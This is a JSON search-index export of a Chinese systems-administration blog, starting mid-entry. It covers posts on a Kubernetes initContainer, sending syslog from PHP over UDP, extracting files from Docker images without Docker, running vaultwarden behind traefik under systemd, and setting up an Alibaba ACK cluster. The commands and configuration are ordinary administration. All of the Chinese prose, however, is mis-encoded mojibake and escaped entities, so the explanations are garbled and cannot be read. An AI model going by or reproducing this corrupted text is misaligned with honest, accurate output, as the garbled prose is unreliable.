[\u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;until nslookup myservice; do echo waiting for myservice; sleep 2; done;\u0026#39;] 9 - name: init-mydb 10 image: busybox 11 command: [\u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;until nslookup mydb; do echo waiting for mydb; sleep 2; done;\u0026#39;] ","date":"2021-10-28","img":"","permalink":"https://rendoumi.com/posts/20211028-dockerfile/","series":null,"tags":null,"title":"Dockerfileçš„ç¼–å†™ä¸è°ƒè¯•æŠ€å·§"},{"categories":null,"content":"ç»™åŒäº‹åšäº†ä¸ª PHP æ¥å£ï¼Œè½¬å‘å‘é€çŸ­ä¿¡çš„è¯·æ±‚ï¼ŒåŒæ—¶è¦æŠŠå‘é€è®°å½•å‘é€åˆ°è¿œç¨‹çš„ cacti çš„ syslog å»\nå¾ˆç®€å•ï¼Œä½†æ˜¯ä¹Ÿä¸ç®€å•\né¦–å…ˆæ˜¯ PHP æœåŠ¡å™¨ï¼Œæ˜¯æœ€ç®€åŒ–ç¼–è¯‘çš„ï¼Œphp -m æŸ¥äº†ä¸€ä¸‹\n1php -m 2[PHP Modules] 3Core 4ctype 5curl 6date 7dom 8fileinfo 9filter 10gettext 11hash 12iconv 13json 14libxml 15openssl 16pcre 17PDO 18pdo_sqlite 19Phar 20posix 21Reflection 22session 23SimpleXML 24SPL 25sqlite3 26standard 27tokenizer 28xml 29xmlreader 30xmlwriter 31 32[Zend Modules] å±…ç„¶æ²¡æœ‰ socket æ¨¡å—ï¼Œæ²¡åŠæ³•ï¼Œæ‰¾åˆ°æºä»£ç ï¼Œç¼–è¯‘ä¸€ä¸ªå®‰è£…ï¼ŒåŸæœ‰çš„ php å®‰è£…è·¯å¾„æ˜¯ /export/servers/php\n1$ tar zxvf php-7.4.0.tar.gz 2$ cd php-7.4.0/sockets 3$ /export/servers/php/bin/phpize 4$ ./configure --enable-sockets --with-php-config=/export/servers/php/bin/php-config 5$ make 6$ make install åˆçœ‹äº†ä¸€çœ¼ï¼Œæ˜¯ php-fpmï¼Œå±…ç„¶æ²¡æœ‰ php.ini ï¼Œå¾—ï¼Œå†ç”Ÿæˆä¸€ä¸ªï¼Œæ”¾åœ¨ /export/servers/php/lib/php.ini\n1extension_dir = \u0026#34;/export/servers/php740/lib/php/extensions/no-debug-non-zts-20190902/\u0026#34; 2extension = sockets.so ç„¶åé‡å¯ php-fpm ï¼Œé‡æ–° php -m æ£€æŸ¥ï¼Œå‘ç°æœ‰ socket æ¨¡å—å°± ok äº†ã€‚\næ¥ä¸‹æ¥å°±æ˜¯ php æºä»£ç äº†\n1\u0026lt;?php 2date_default_timezone_set(\u0026#39;Asia/Shanghai\u0026#39;); 3 4function send_remote_syslog($message) { 5 $sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP); 6 foreach(explode(\u0026#34;\\n\u0026#34;, $message) as $line) { 7 $syslog_message = \u0026#34;\u0026lt;22\u0026gt;\u0026#34; . date(\u0026#39;M d H:i:s \u0026#39;) . \u0026#39;Qi_an_xin sms_log: \u0026#39; . $line; 8 socket_sendto($sock, $syslog_message, strlen($syslog_message), 0, \u0026#39;172.18.31.6\u0026#39;, 514); 9 } 10 socket_close($sock); 11} 12 13 send_remote_syslog(\u0026#34;ABC éªŒè¯ç : 39792192\u0026#34;); 14?\u0026gt; è¿™æ ·å°±å¯ä»¥äº†ï¼Œä¸Šé¢ä»£ç æ¯”è¾ƒéš¾ç†è§£çš„æ˜¯\u0026lt;22\u0026gt;ï¼Œé‚£æ˜¯æŠ¥é”™çº§åˆ«çš„è®¡ç®—æ–¹æ³•ï¼ŒFacility + Severityï¼š\n1 * Facility values: 2 * 0 kernel messages 3 * 1 user-level messages 4 * 2 mail system 5 * 3 system daemons 6 * 4 security/authorization messages 7 * 5 messages generated internally by syslogd 8 * 6 line printer subsystem 9 * 7 network news subsystem 10 * 8 UUCP subsystem 11 * 9 clock daemon 12 * 10 security/authorization messages 13 * 11 FTP daemon 14 * 12 NTP subsystem 15 * 13 log audit 16 * 14 log alert 17 * 15 clock daemon 18 * 16 local user 0 (local0) (default value) 19 * 17 local user 1 (local1) 20 * 18 local user 2 (local2) 21 * 19 local user 3 (local3) 22 * 20 local user 4 (local4) 23 * 21 local user 5 (local5) 24 * 22 local user 6 (local6) 25 * 23 local user 7 (local7) 26 * 27 * Severity values: 28 * 0 Emergency: system is unusable 29 * 1 Alert: action must be taken immediately 30 * 2 Critical: critical conditions 31 * 3 Error: error conditions 32 * 4 Warning: warning conditions 33 * 5 Notice: normal but significant condition (default value) 34 * 6 Informational: informational messages 35 * 7 Debug: debug-level messages è®¡ç®—æ–¹æ³•å°±æ˜¯ ï¼ˆfacility*8 + severityï¼‰ï¼Œè¿™é‡Œçš„22+0ï¼Œå¯ä»¥ç†è§£æˆ local6 ï¼Œå°±æ˜¯çº§åˆ«6\nå¦‚æœå‘äº†ä¸€ä¸ª \u0026ldquo;local use 4\u0026rdquo; å’Œ Serverity = 5 çš„æ¶ˆæ¯ï¼Œé‚£ä¹ˆå°±æ˜¯ 20Ã—8+5=165 ï¼ŒåŒ…å¤´å°±æ˜¯ \u0026lt;165\u0026gt;\n","date":"2021-10-28","img":"","permalink":"https://rendoumi.com/posts/20211028-php_syslog/","series":null,"tags":null,"title":"PHPç¨‹åºå¦‚ä½•å‘é€syslogåˆ°è¿œç¨‹æœåŠ¡å™¨"},{"categories":null,"content":"ç”¨ kubernetes è¶Šå¤šï¼Œç”¨ docker è¶Šå¤šï¼Œå°±æ„ˆå‘æ„Ÿè§‰åˆ°å¥½å¤„å¤šå¤šã€‚\nç®€ç®€å•å•çš„ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œç”¨ docker åŸºæ¿ alphine å°è£…ï¼Œå°±å¯ä»¥è¿è¡Œèµ·ä¸€ä¸ª pod ï¼Œç„¶åæŒ‡å®š deploymentã€svcã€ingressï¼Œå°±å¯ä»¥å°†æœåŠ¡æš´éœ²å‡ºå»ã€‚\nå…¶å®å¾ˆå¤šæƒ…å†µä¸‹å•å¯æ‰§è¡Œæ–‡ä»¶ + systemdä¹Ÿæ˜¯ä¸é”™çš„é€‰æ‹©ã€‚\nè¿™ä¸å°±é‡åˆ°ä¸ªé—®é¢˜ï¼Œghostunnel è¿™ä¸ªè½¯ä»¶ï¼Œgithub åªé‡Šæ”¾å‡ºäº†æºä»£ç ä»¥åŠ windows ã€linux å’Œ mac çš„ä¸‰ä¸ªå¯æ‰§è¡Œç‰ˆæœ¬ã€‚\nå¯æˆ‘çš„æ‰§è¡Œç¯å¢ƒæ˜¯ nanopi ï¼Œæ˜¯ä¸ª arm7 çš„æ¶æ„ï¼Œå°±æ— è®¡å¯æ–½äº†ã€‚\næ— å¥ˆä¸‹ï¼Œåœ¨ nanopi ä¸Šè£…äº† go ï¼Œç¼–è¯‘äº†ä¸ª arm7 çš„å‡ºæ¥ã€‚\nä½†æ˜¯é‡åˆ° vaultwanden ï¼Œrust çš„ï¼Œå°±æ²¡æ³•å¼„äº†ï¼Œvps å¤ªå¼±ï¼Œæ ¹æœ¬æ— æ³•ç”¨ cargo ç¼–è¯‘ã€‚\né‚£æ€ä¹ˆåŠå‘¢ï¼Ÿæ–¹æ³•å¦‚ä¸‹ï¼Œä¸å®‰è£… Docker ï¼Œä¹Ÿå¯ä»¥æŠŠé•œåƒä¸­çš„æ–‡ä»¶æŠ½å–å‡ºæ¥\n1$ mkdir vm 2$ wget https://raw.githubusercontent.com/jjlin/docker-image-extract/main/docker-image-extract 3$ chmod +x docker-image-extract 4$ ./docker-image-extract vaultwarden/server:alpine 5Getting API token... 6Getting image manifest for vaultwarden/server:alpine... 7Fetching and extracting layer a0d0a0d46f8b52473982a3c466318f479767577551a53ffc9074c9fa7035982e... 8Fetching and extracting layer 3a9a529931676767ec84d35ab19774b24bd94e20f6fff7e6bda57ef5f2a66cfc... 9Fetching and extracting layer f9dcfa9aefe67ce52ab2a73e515ea715d242348b8fc338dbe4ca72a853ea0318... 10Fetching and extracting layer 4249d8cece35148b5faca2c6a98d566a271a1996b127b14480793ee8825e43c0... 11Fetching and extracting layer 72f4873a62cc82eaf28905077df3791e3b235bf5d17670e7aff6d5fb5e280739... 12Fetching and extracting layer 8eb772c524f9d998c8c7c92acc5ba96e3e9ebfb175dbb2441fe6e7b7598874f5... 13Fetching and extracting layer 663794f103b44abb8a90e1376dce14735905e2f938b4ca7e0ff379b09cbf6148... 14Image contents extracted into ./output. è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨ output ç›®å½•ä¸‹å¾—åˆ° vaultwarden å’Œ web-vault\nå¦‚æœæˆ‘ä»¬è¦æ‹¿åˆ° arm7 çš„é•œåƒï¼Œè¿˜éœ€è¦å†è´¹ç‚¹åŠ²ï¼Œä»¥ ghostunnel ä¸ºä¾‹ï¼š\nè®¿é—®ï¼š https://hub.docker.com/r/ghostunnel/ghostunnel/tags æ‰¾åˆ° linux/arm/v7 çš„ tagï¼Œ40247f4b49c3 ç‚¹å¼€åï¼Œæ‰¾åˆ° DIGEST: ï¼Œå¤åˆ¶sha256ä»¥åŠåé¢çš„å­—ä¸²ï¼Œsha256:40247f4b49c364046ebf47696dbd31752b4db2ae2b9edf1fd4c52c2573f06e04\næŒ‰å¦‚ä¸‹æ–¹æ³•é‡Šæ”¾å³å¯ï¼š\n1$ ./docker-image-extract ghostunnel/ghostunnel:sha256:40247f4b49c364046ebf47696dbd31752b4db2ae2b9edf1fd4c52c2573f06e04 ä¸ç”¨æ‹…å¿ƒç›®å½•ç»“æ„ï¼Œé‡Šæ”¾å‡ºæ¥çš„æ–‡ä»¶ä¼šæ”¾åˆ°å½“å‰ output ç›®å½•ä¸‹ã€‚\n","date":"2021-10-27","img":"","permalink":"https://rendoumi.com/posts/20211027-docker_extract_file/","series":null,"tags":null,"title":"æ²¡æœ‰è£…Dockerå¦‚ä½•ä»é•œåƒä¸­é‡Šæ”¾å‡ºæ–‡ä»¶"},{"categories":null,"content":"ä¸ºä»€ä¹ˆä¼šæœ‰é Docker ç¯å¢ƒè¿™ä¸ªæ€ªå­—çœ¼å‘¢ï¼Ÿ\næ— ä»–ï¼Œå› ä¸ºæ»¡ç½‘æœç´¢åˆ°çš„æ•™ç¨‹éƒ½æ˜¯åœ¨ Docker ç¯å¢ƒä¸‹å®‰è£…ä½¿ç”¨ã€‚\nä½†æ˜¯ç©·å•Šï¼Œå…«æˆ’çš„ vps æ˜¯ä¸ªå•æ ¸ 500m çš„ justhost æœºå™¨ï¼Œä¾¿å®œçš„å¾ˆï¼Œè¿™ç§å»‰ä»·æœºå™¨æ¥è·‘ Dockerï¼ŒåŸºæœ¬è¦å 100Mï¼Œè·‘ä¸å¤ªåŠ¨ã€‚\nè¿™ç§ä¸€ç©·äºŒç™½çš„ç¯å¢ƒï¼Œå°±åªèƒ½æŠŠ Bitwarden ä»å®¹å™¨é‡Œæ‹†å‡ºæ¥ç”¨ã€‚\nå¥½åœ¨ Bitwarden_rs æ˜¯ä¸€ä¸ª rust ç¨‹åºï¼Œå å†…å­˜(16Må·¦å³)å’Œcpuæå°‘ï¼Œæœ¬èº«å°±é€‚åˆåœ¨ systemd ç¯å¢ƒä¸‹è·‘ã€‚\nè¿™é‡Œå°±åˆ©ç”¨ vaultwarden å’Œ traefikï¼Œåœ¨ä¸€å°è€ç ´å°æœåŠ¡å™¨ä¸Šè¿è¡Œã€‚\nç³»ç»Ÿç¯å¢ƒæ˜¯ CentOS 7.9\næ­¥éª¤å¦‚ä¸‹ï¼š\nä¸€ã€ä¸‹è½½bitwarden(vaultwarden) 1wget https://github.com/dani-garcia/vaultwarden/archive/refs/tags/1.23.0.tar.gz äºŒã€å®‰è£…cargoå¹¶ç¼–è¯‘ï¼ˆå¯é€‰ï¼‰ 1yum install -y epel-release 2yum install -y openssl-devel cargo 3 4cd vaultwarden-1.23.0 5cargo build --release --features sqlite ç›´æ¥çˆ†é”™å•Šï¼Œå°å°çš„ vps è¿ç¼–è¯‘éƒ½è¿‡ä¸å»ï¼Œç¼–è¯‘è¿›ç¨‹éƒ½è¢« kill æ‰äº†\nä¸‰ã€ä¸‹è½½vaultwardenä¸»æ–‡ä»¶ ç¼–è¯‘ä¸é€šï¼Œå°±åªèƒ½æƒ³åˆ«çš„åŠæ³•äº†ã€‚Faint\næ‰¾ä¸€å°æœ‰ docker æœºå™¨ï¼Œä»é‡Œé¢æŠŠæ–‡ä»¶éƒ½è§£æå‡ºæ¥å¥½äº†\n1docker pull vaultwarden/server:alpine 2docker create --name vw vaultwarden/server:alpine 3docker cp vw:/vaultwarden . 4docker cp vw:/web-vault . 5docker rm vw è¿™æ ·ä¼šå¾—åˆ°ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ vaultwarden å’Œä¸€ä¸ªç›®å½• web-vault\næˆ‘ä»¬æŠŠè¿™ä¸¤ä¸ªä¸œè¥¿éƒ½æŒªåˆ° /opt/vaultwarden ç›®å½•ä¸‹ï¼Œå¹¶ä¸”å»ºç«‹ data æ–‡ä»¶å¤¹ï¼Œç”¨æ¥å­˜æ”¾è¦ç”Ÿæˆçš„ sqlite3 æ•°æ®æ–‡ä»¶ã€‚\n1mkdir -p /opt/vaultwarden/data 2mv vaultwarden /opt/vaultwarden 3mv web-vault /opt/vaultwarden å››ã€ç”Ÿæˆsystemdå¯åŠ¨æ–‡ä»¶ æ³¨æ„ï¼Œä¸‹é¢æˆ‘ä»¬è®¾ç½®äº† vaultwarden ROCKET_ADDRESS çš„ç›‘å¬åœ°å€æ˜¯ 127.0.0.1 ï¼Œä¸€æ˜¯ä¸ºäº†å®‰å…¨ï¼ŒäºŒæ˜¯ä¸ºäº†ä¸‹ä¸€æ­¥æˆ‘ä»¬æ­å»º traefikï¼Œæ¥åä»£ vaultwarden ç”¨çš„ï¼›å› ä¸ºè®¿é—® vaultwarden å¿…é¡»è¦åŠ è¯ä¹¦ï¼Œè€Œå®ƒæœ¬èº«æ˜¯æ²¡æœ‰è¿™ä¸ªåŠŸèƒ½çš„ï¼Œå¿…é¡»å‰ç½®ä¸€ä¸ª nginx æˆ–è€… haproxy æˆ–è€… traefik æˆ–è€… carddyã€‚\n1cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/systemd/system/vaultwarden.service 2[Unit] 3Description=Bitwarden 4 5[Service] 6Type=simple 7Restart=always 8Environment=\u0026#34;ROCKET_ADDRESS=127.0.0.1\u0026#34; 9WorkingDirectory=/opt/vaultwarden 10ExecStart=/opt/vaultwarden/vaultwarden 11 12[Install] 13WantedBy=local.target 14EOF äº”ã€é…ç½®traefik 1wget https://github.com/traefik/traefik/releases/download/v2.4.8/traefik_v2.4.8_linux_amd64.tar.gz 2tar zxvf traefik_v2.4.8_linux_amd64.tar.gz 3 4mkdir -p /opt/traefik/dynamic 5mv traefik /opt/traefik ç”Ÿæˆtraefiké…ç½®æ–‡ä»¶ï¼Œåˆ©ç”¨ traefik è‡ªåŠ¨ç”³è¯· Let\u0026rsquo;s encrypt è¯ä¹¦\n1cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /opt/traefik/traefik.yml 2log: 3 level: DEBUG 4 5api: 6 insecure: false 7 dashboard: true 8 9entryPoints: 10 http: 11 address: \u0026#34;:80\u0026#34; 12 http: 13 redirections: 14 entryPoint: 15 to: https 16 scheme: https 17 https: 18 address: \u0026#34;:443\u0026#34; 19 20certificatesResolvers: 21 letsEncrypt: 22 acme: 23 storage: /opt/traefik/acme.json 24 email: zhangranrui@gmail.com 25 tlsChallenge: {} 26 httpChallenge: 27 entryPoint: http 28 29providers: 30 file: 31 directory: /opt/traefik/dynamic 32 watch: true é…ç½® vaultwarden ä»£ç†\n1cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /opt/traefik/dynamic/pass.yml 2http: 3 routers: 4 https_01: 5 rule: \u0026#34;Host(`xxx.rendoumi.com`)\u0026#34; 6 service: svc_01 7 tls: 8 certresolver: letsEncrypt 9 http_01: 10 rule: \u0026#34;Host(`xxx.rendoumi.com`)\u0026#34; 11 service: svc_01 12 entryPoints: 13 - http 14 services: 15 svc_01: 16 loadBalancer: 17 servers: 18 - url: \u0026#34;http://localhost:8000\u0026#34; 19EOF è®¾ç½® traefik çš„ systemd å¯åŠ¨æ–‡ä»¶\n1cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/systemd/system/traefik.service 2[Unit] 3Description=traefik 4 5[Service] 6Type=simple 7Restart=always 8WorkingDirectory=/export/servers/traefik 9ExecStart=/export/servers/traefik/traefik 10 11[Install] 12WantedBy=local.target 13EOF äº”ã€å¯åŠ¨vaultwardenå’Œtraefik 1systemctl daemon-reload 2systemctl enable --now vaultwarden 3systemctl enable --now traefik æ‰“å¼€é¡µé¢ï¼Œæˆ‘ä»¬å°±æˆåŠŸçš„ç”¨ä¸€å°è€ç ´å°æ­å»ºäº†è‡ªå·±çš„å¯†ç ç®¡ç†æœåŠ¡å™¨ï¼ï¼ï¼\n","date":"2021-10-27","img":"","permalink":"https://rendoumi.com/posts/20211027-bitwarden/","series":null,"tags":null,"title":"Bitwardenï¼ˆvaultwardenï¼‰å¦‚ä½•åœ¨éDockerç¯å¢ƒä¸‹å®‰è£…ä½¿ç”¨"},{"categories":null,"content":"åœ¨ç”Ÿäº§ç¯å¢ƒæ¥åˆ›å»ºé˜¿é‡ŒACKæ‰˜ç®¡k8sé›†ç¾¤çš„è¿‡ç¨‹ï¼š\nå®Œå…¨ç”¨äºç”Ÿäº§ï¼Œä¸æ˜¯æ­å»ºæ¥åšæµ‹è¯•ç”¨çš„ã€‚\næˆå…¬å¸å§”æ‰˜ï¼Œç»™çš„RAMç”¨æˆ·ï¼Œæ‰€ä»¥é˜¿é‡Œäº‘RAMç¬¬ä¸€æ¬¡ç™»å½•åï¼Œå¼ºåˆ¶ä¿®æ”¹å¯†ç \nç„¶åæˆæƒèµ„æºç®¡ç†ï¼Œ æ­£å¼å¼€å§‹å»ºç«‹è¿‡ç¨‹\nä¸€ã€å‡†å¤‡æ¡ä»¶ ä¸¤å°åŠä»¥ä¸ŠecsæœåŠ¡å™¨\né˜¿é‡Œäº‘è´¦æˆ·ä½™é¢100å…ƒä»¥ä¸Šï¼ˆé˜¿é‡Œäº‘è¦æ±‚ï¼‰\né˜¿é‡Œäº‘ossä¸€ä¸ªï¼ˆosså’Œecsåœ¨ä¸€ä¸ªåŒºåŸŸæœ€å¥½ï¼‰\né¦–å…ˆé˜¿é‡Œäº‘åˆ›å»ºk8sé›†ç¾¤è¦æ±‚è‡³å°‘æœ‰ä¸¤å°ecsæœåŠ¡å™¨ï¼Œå¯ä»¥åˆ›å»ºé›†ç¾¤çš„æ—¶å€™å†è´­ä¹°ï¼Œä¸è¦é¢„å…ˆè´­ä¹°ã€‚\näºŒã€ä¸‹é¢å¼€å§‹åˆ›å»ºï¼š é˜¿é‡Œäº‘æœ€å·¦ä¸Šè§’çš„èœå•ï¼ˆæ–°ç‰ˆæœ¬é¦–é¡µï¼‰-\u0026gt;äº§å“ä¸æœåŠ¡-\u0026gt;å®¹å™¨æœåŠ¡kubernetesç‰ˆæœ¬\nç¬¬ä¸€æ¬¡åˆ›å»ºä¼šè®©å¼€å¯ramæˆæƒï¼Œæ­£å¸¸ç‚¹å‡»æˆæƒå°±å¯ä»¥\nç‚¹å‡»åˆ›å»ºé›†ç¾¤\nç‚¹å‡»åå¦‚ä¸‹\nå„ä¸ªé€‰é¡¹çš„è¯¦ç»†è¯´æ˜ï¼š\nç¬¬ä¸€éƒ¨åˆ†ï¼š\né›†ç¾¤ç‰ˆæœ¬ï¼š æœ€ä¸Šé¢å¯ä»¥é€‰æ‹©ACKæ‰˜ç®¡ç‰ˆï¼Œå’Œå…¶ä»–4ä¸ªç‰ˆæœ¬ï¼Œç€é‡è¯´ä¸€ä¸‹ä¸“æœ‰ç‰ˆå’Œæ‰˜ç®¡ç‰ˆçš„åŒºåˆ«\nä¸“æœ‰ç‰ˆæœ¬ï¼šmasterå’Œworkeréƒ½éœ€è¦è‡ªå·±åˆ›å»ºï¼Œå¦‚æœéœ€è¦é«˜å¯ç”¨ï¼Œé‚£ä¹ˆmasteréœ€è¦è‡³å°‘ä¸‰ä¸ªï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä½ ä¸æƒ³æŠŠmasterå’Œworkeræ”¾åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šï¼Œå°±è¦å¤šä½¿ç”¨ä¸‰å°æœåŠ¡å™¨ã€‚\nACKæ‰˜ç®¡ç‰ˆï¼šmasterç”±é˜¿é‡Œäº‘ç»™åˆ›å»ºï¼Œè‡ªå·±åªéœ€è¦è´­ä¹°workeræœåŠ¡å™¨ã€‚\né›†ç¾¤åç§°ï¼š k8s-hbb\nåœ°åŸŸï¼š è¯·é€‰æ‹©è‡ªå·±ecså’Œrdsç­‰èµ„æºæ‰€åœ¨åŒºåŸŸï¼Œè¿™é‡Œæ˜¯åä¸œ2ï¼ˆä¸Šæµ·ï¼‰\nKubernetesç‰ˆæœ¬ï¼šé˜¿é‡Œäº‘å·²ç»åšå¥½å……åˆ†çš„æµ‹è¯•äº†ï¼Œæ‰€ä»¥é€‰æ‹©é»˜è®¤çš„å³å¯ã€‚è¿™é‡Œæ˜¯ 1.18.8-aliyun.1\nå®¹å™¨è¿è¡Œæ—¶ï¼š Docker 19.03.5\nç¬¬äºŒéƒ¨åˆ†ï¼š\nä¸“æœ‰ç½‘ç»œ: ä¸“æœ‰ç½‘ç»œé€‰æ‹©å’Œecsï¼ŒrdsåŒä¸€ä¸ªä¸“æœ‰ç½‘ç»œï¼Œè¿™é‡Œæ˜¯vpc-uf6pcr7nvp3dqmx86yyk0ï¼Œç½‘æ®µæ˜¯172.19.0.0/16\nè™šæ‹Ÿäº¤æ¢æœºï¼š åŒä¸€ä¸ªä¸“æœ‰ç½‘ç»œä¸‹é¢çš„äº¤æ¢æœºæ˜¯å¯ä»¥äº’é€šçš„ï¼Œè¿™é‡Œæ–°å»ºä¸€ä¸ªè™šæ‹Ÿäº¤æ¢æœºï¼Œç½‘æ®µæ˜¯172.19.240.0/20\nç½‘ç»œæ’ä»¶ï¼š é€‰Flannelï¼Œé™¤å»é˜¿é‡Œäº‘è‡ªå·±çš„åŒºåˆ«æè¿°ï¼Œè¿˜æœ‰ä¸€ç‚¹ å¦‚æœä½¿ç”¨flannelæ’ä»¶ï¼Œåˆ™workerç«¯å¯¹å¤–ï¼Œè®¿é—®å¤–ç½‘ï¼ˆæ¯”å¦‚çŸ­ä¿¡æ¥å£ç­‰ï¼‰ä½¿ç”¨çš„æ˜¯worderæ‰€åœ¨ecsè‡ªå·±çš„eipæˆ–è€…å¦‚æœä½¿ç”¨çš„æ˜¯snatæ¨¡å¼ï¼Œå°±æ˜¯snatç»‘å®šçš„eipã€‚å¦‚æœä½¿ç”¨çš„terwayæ’ä»¶åˆ™èµ°çš„å°±æ˜¯snatçš„eipã€‚æ³¨æ„ï¼Œåˆ›å»ºé›†ç¾¤æˆåŠŸåï¼Œä¼šä¸ºé›†ç¾¤åˆ›å»ºä¸€ä¸ªå¯¹å¤–æœåŠ¡çš„ingressçš„slbï¼Œworkerå†…éƒ¨çš„å®¹å™¨ç›´æ¥å¯¹å¤–è®¿é—®ï¼Œä½¿ç”¨çš„ä¸æ˜¯è¿™ä¸ªslbçš„ipã€‚slbåªæ˜¯è¿›æ¥çš„é€šé“ã€‚\npodç½‘ç»œ CIDRï¼šä¸ºç»Ÿä¸€èµ·è§ï¼Œ10.240.0.0/20\nservice CIDRï¼šä¸ºç»Ÿä¸€èµ·è§ï¼Œ192.168.240.0/20\næ³¨æ„ä»¥ä¸Š å»ºç«‹å¥½äº†ä¸‰ä¸ªç½‘æ®µï¼Œä¸‰ä¸ªç½‘æ®µä¸­å‡æœ‰240å­—æ®µï¼Œä¾¿äºè®°å¿†\nECS(2å°)ï¼š172.19.240.0/20\nPODç½‘æ®µï¼š10.240.0.0/20\nServiceç½‘æ®µï¼š192.168.240.0/20 â€‹\nèŠ‚ç‚¹IPæ•°é‡ï¼š256ï¼ŒæŒ‡å•ä¸ªèŠ‚ç‚¹å¯è¿è¡Œ Pod æ•°é‡çš„ä¸Šé™ã€‚ ä¸€å®šè¦æ‹‰åˆ°æœ€å¤§é‡256 ï¼Œå¼„åˆ°16çš„è¯ï¼Œä¸€ä¸ªèŠ‚ç‚¹æœ¬èº«è¦è·‘10å¤šä¸ªsystemçš„podï¼Œå°±æ— æ³•è·‘åº”ç”¨podäº†ã€‚\nç¬¬ä¸‰éƒ¨åˆ†:\né…ç½®SNATï¼šå¿…é€‰é…ç½®SNATï¼Œå¯¹å¤–ä¸»åŠ¨è®¿é—®çš„æ—¶å€™IPéœ€è¦ä¸€è‡´ã€‚è§£é‡Šï¼šå¦‚æœecsæ²¡æœ‰è®¿é—®å¤–ç½‘èƒ½åŠ›ï¼Œåˆ™å¿…é¡»ä½¿ç”¨snatï¼Œsnatå°±æ˜¯æŠŠvpcç»‘å®šä¸€ä¸ªeipï¼Œç„¶åç»™å†…éƒ¨çš„ecsä½¿ç”¨natæ–¹å¼ä¸»åŠ¨å¤–å‡ºè®¿é—®ç”¨çš„ï¼Œæ¯”å¦‚ä¸»åŠ¨åé—®ç¬¬ä¸‰æ–¹çš„æ¥å£ç­‰ã€‚å¦‚æœecsè‡ªå·±å·²ç»ç»‘å®šäº†eipæˆ–è€…è‡ªå¸¦ipå¸¦å®½ï¼Œå¯ä»¥ä¸é€‰æ‹©ã€‚\nAPISERVERè®¿é—®ï¼šå¿…é€‰å…¬ç½‘EIPæš´éœ²ï¼Œè¿™ä¸ªç»‘å®šä»¥åipä¸æ”¶è´¹ï¼Œå¯ä»¥ä½¿ç”¨æµé‡åŒ…ï¼Œç®¡ç†masterç”¨çš„ã€‚å¦‚æœè¦ä½¿ç”¨ã€äº‘æ•ˆã€å¿…é€‰ã€‚\né»˜è®¤ä¸é€‰ä¸­ä½¿ç”¨EIPæš´éœ²API Serverã€‚ API Serveræä¾›äº†å„ç±»èµ„æºå¯¹è±¡ï¼ˆPodï¼ŒServiceç­‰ï¼‰çš„å¢åˆ æ”¹æŸ¥åŠwatchç­‰HTTP Restæ¥å£ã€‚ - å¦‚æœé€‰æ‹©å¼€æ”¾ï¼Œä¼šåˆ›å»ºä¸€ä¸ªEIPï¼Œå¹¶æŒ‚è½½åˆ°å†…ç½‘SLBä¸Šã€‚æ­¤æ—¶ï¼ŒMasterèŠ‚ç‚¹çš„6443ç«¯å£ï¼ˆå¯¹åº”API Serverï¼‰æš´éœ²å‡ºæ¥ï¼Œç”¨æˆ·å¯ä»¥åœ¨å¤–ç½‘é€šè¿‡kubeconfigè¿æ¥å¹¶æ“ä½œé›†ç¾¤ã€‚ - å¦‚æœé€‰æ‹©ä¸å¼€æ”¾ï¼Œåˆ™ä¸ä¼šåˆ›å»ºEIPï¼Œæ‚¨åªèƒ½åœ¨VPCå†…éƒ¨ç”¨kubeconfigè¿æ¥å¹¶æ“ä½œé›†ç¾¤ã€‚\nRDSç™½åå•ï¼šè¿™ä¸ªæ³¨æ„é€‰æ‹©ï¼Œç›®å‰é˜¿é‡Œäº‘æ˜¾ç¤ºå‡ºæ¥çš„åªæœ‰æ™®é€šçš„mysql-rdsï¼Œredisçš„å’Œpolardbçš„éƒ½ä¸æ˜¾ç¤º\nå®‰å…¨ç»„ï¼šé€‰æ‹©ä¼ä¸šç±»å‹å°±å¯ä»¥ï¼ŒåæœŸå¯ä»¥ä¿®æ”¹è§„åˆ™ã€‚\nç¬¬å››éƒ¨åˆ†\nKube-proxyæ¨¡å¼ï¼šé€‰IPVSï¼Œæ¯”IPTABLESæ€§èƒ½é«˜\né›†ç¾¤æœ¬åœ°åŸŸåï¼š hbb.localï¼Œ.localç»“å°¾çš„ç»Ÿç»Ÿæ˜¯æœ¬åœ°åŸŸå\nä¸‹ä¸€æ­¥ï¼Œå¢åŠ worker\nå¿…é¡»é€‰æ–°å¢å®ä¾‹ï¼Œä¸è¦é€‰æ‹©ç°æœ‰å®ä¾‹\næ–°å¢å®ä¾‹ï¼šå°±æ˜¯æ–°è´­ä¹°ecsï¼Œè¦æ³¨æ„è‡ªå·±é€‰æ‹©vpcå’Œäº¤æ¢æœº\né€‰æ‹©å·²æœ‰å®ä¾‹ï¼šå¯ä»¥é€‰æ‹©ç°æœ‰çš„æœåŠ¡å™¨ï¼Œæ³¨æ„ï¼šç°æœ‰æœåŠ¡å™¨ä¼šè¢«æ›´æ¢ç¡¬ç›˜ï¼Œç¡¬ç›˜å†…å®¹ä¼šè¢«æ¸…ç©ºã€‚\nä¼ä¸šçº§å®ä¾‹è§„æ ¼æ—\nå®ä¾‹è§„æ ¼æ—åç§°æ ¼å¼ä¸ºecs.\u0026lt;è§„æ ¼æ—\u0026gt;ï¼Œå®ä¾‹è§„æ ¼åç§°ä¸ºecs.\u0026lt;è§„æ ¼æ—\u0026gt;.largeã€‚\necsï¼šäº‘æœåŠ¡å™¨ECSçš„äº§å“ä»£å·ã€‚ \u0026lt;è§„æ ¼æ—\u0026gt;ï¼šç”±å°å†™å­—æ¯åŠ æ•°å­—ç»„æˆã€‚ å°å†™å­—æ¯ä¸ºæŸä¸ªå•è¯çš„ç¼©å†™ï¼Œå¹¶æ ‡å¿—ç€è§„æ ¼æ—çš„æ€§èƒ½é¢†åŸŸã€‚éƒ¨åˆ†å°å†™å­—æ¯çš„å«ä¹‰å¦‚ä¸‹æ‰€ç¤ºã€‚ 